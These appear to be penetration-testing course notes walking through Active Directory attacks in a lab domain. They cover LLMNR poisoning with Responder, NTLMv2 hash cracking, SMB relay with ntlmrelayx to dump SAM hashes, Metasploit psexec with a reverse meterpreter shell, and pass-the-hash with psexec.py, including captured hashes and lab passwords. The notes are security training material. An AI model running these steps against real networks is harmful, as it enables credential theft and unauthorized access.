# AD - Initial Attack Vectors

## [LLMNR Poisoning](https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/)

➡️ **LLMNR** (Link-Local Multicast Name Resolution) protocol (NetBIOS / NBT-NS successor) allows hosts to perform name resolution for hosts on the same local network without requiring a DNS server.

- When a host DNS query fails -> the host broadcast an LLMNR query across the local network
  - An attacker can listen for these queries and respond to them with its IP to redirect traffic, leading to relay attacks and credentials theft (username & NTLM hash)

![LLMNR Posoning - tcm-sec.com](.gitbook/assets/llmnr-overview.png)



### Responder

➡️ [Responder](https://github.com/lgandx/Responder) - LMNR, NBT-NS and MDNS poisoner

- HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server
- Supports NTLMv1/NTLMv2/LMv2 with Extended Security NTLMSSP
- Built-in HTTP and HTTPS auth servers
- Built-in MSSQL auth server
- ... more ...

```bash
sudo responder -I eth0 -dPv
```

- Login to `THEPUNISHER` VM with `fcastle` user and try to open WinExplorer and navigate to `\\192.168.31.131` (Kali IP)
- An event occurs and triggers LLMNR
  - victim's username and password NTLMv2 hash received


![](.gitbook/assets/2024-07-28_21-48-50_660.png)

### NTLMv2 Crack

- Save the hash into a `hashes.txt` file and try to crack it

```bash
mkdir -p ~/tcm/peh/ad-attacks
cd ~/tcm/peh/ad-attacks

nano hashes.txt
# Paste the entire hash here
# e.g.
fcastle::MARVEL:326a2463163fdc3c:F7960DB37F933089E086898EC14E6C78:01010000000000008056A8C737E1DA012259B2C298FAD80B00000000020008004400530035004E0001001E00570049004E002D0058004B00300049004C0054004B0049004B004200560004003400570049004E002D0058004B00300049004C0054004B0049004B00420056002E004400530035004E002E004C004F00430041004C00030014004400530035004E002E004C004F00430041004C00050014004400530035004E002E004C004F00430041004C00070008008056A8C737E1DA0106000400020000000800300030000000000000000100000000200000904D97995337C0F1A56FEF978A82D6E80397E74EE021151E600DB10AC038DF7B0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00330031002E003100330031000000000000000000

# Run hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

![Cracked password](.gitbook/assets/2024-07-28_21-59-11_661.png)

---

## [SMB Relay](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)

➡️ **SMB** (Server Message Block) is a network file sharing protocol. Common in Windows, it allows shared access to files and printers. However, when unsecured and paired with **NTLM** authentication, it becomes a target to relay attacks.

- Attackers intercept and relay SMB authentication attempts to another server, impersonating the user and exploiting SMB due to lack of SMB signing, gaining unauthorized access
- Requirements:
  - SMB signing disabled or not enforced
  - Relayed user must have local admin credentials
  - Credentials cannot be relayed to the same machine

**Identify the hosts without SMB signing**.

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.31.90-93 -Pn
```

```bash
-------------------------------------------------------------
Nmap scan report for hydra-dc.MARVEL.local (192.168.31.90)
Host is up (0.00034s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

-------------------------------------------------------------
Nmap scan report for spiderman.MARVEL.local (192.168.31.92)
Host is up (0.00045s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

-------------------------------------------------------------
Nmap scan report for thepunisher.MARVEL.local (192.168.31.93)
Host is up (0.00038s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

- SMB signing is not enforced (default setting for Windows workstations)

```bash
# Check on Windows - cmd
reg query HKLM\System\CurrentControlSet\Services\LanManServer\Parameters | findstr /I securitysignature
```

![](.gitbook/assets/2024-07-29_17-36-56_666.png)

- Create a `targets.txt` file with the gathered targets

```bash
echo -e "192.168.31.92\n192.168.31.93" > targets.txt
```

- Setup Responder configuration file

```bash
sudo nano /etc/responder/Responder.conf
```

```bash
# Switch Off SMB and HTTP
SMB = Off
...
HTTP = Off
...
```

```bash
# Run Responder
sudo responder -I eth0 -dPv
```

![](.gitbook/assets/2024-07-29_17-11-00_662.png)

### ntlmrelayx.py

➡️ [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) - This module performs the SMB Relay attacks to many target protocols (SMB, MSSQL, LDAP, etc).

- Setup the NTLM relay
- (`ntlmrelayx.py` is older version installed via [PimpMyKali](https://github.com/Dewalt-arch/pimpmykali/blob/master/pimpmykali.sh))

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

- Login to `THEPUNISHER` VM with `fcastle` user and try to open WinExplorer and navigate to `\\192.168.31.131` (Kali IP)
- An event occurs and triggers LLMNR, is captured by responder, passed to `ntlmrelayx` with relays the credentials to the targets in our `targets.txt` file

![](.gitbook/assets/2024-07-29_17-19-49_663.png)

- The local SAM hashes are dumped from `SPIDERMAN` and automatically saved into the `192.168.31.92_samhashes.sam` file

```bash
# SPIDERMAN - 192.168.31.92 SAM Hashes

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60d1d3dc4291fca471e146c798f8d603:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

- Try to start an interactive shell via `ntlmrelayx.py`

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
# trigger the event in the Windows VM

[...]
[*] Authenticating against smb://192.168.31.92 as MARVEL\fcastle SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

```bash
# Bind to the the SMB shell
nc 127.0.0.1 11000
```

![](.gitbook/assets/2024-07-29_17-25-15_664.png)

```bash
# Execute commands

sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# trigger the event in the Windows VM
```

![](.gitbook/assets/2024-07-29_17-30-47_665.png)

### msfconsole - shell access

```bash
msfconsole
```

```bash
search psexec
use exploit/windows/smb/psexec

set payload windows/x64/meterpreter/reverse_tcp
set rhosts 192.168.31.93
set smbdomain MARVEL.local
set smbuser fcastle
set smbpass Password1
show targets # proceed with Automatic

run
```

![](.gitbook/assets/2024-07-29_17-56-07_667.png)

```bash
background
sessions
session 1
```

```bash
# Do the hash attack

# Set SMB user to a local user
set smbuser administrator
unset smbdomain
set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
run
```

![](.gitbook/assets/2024-07-29_17-59-35_668.png)

### psexec.py - shell access

➡️ [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)

```bash
# Login with password
psexec.py MARVEL.local/fcastle:'Password1'@192.168.31.93
psexec.py MARVEL.local/fcastle:@192.168.31.93

# Login with hash
psexec.py administrator@192.168.31.93 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

![](.gitbook/assets/2024-07-29_18-03-18_669.png)

---

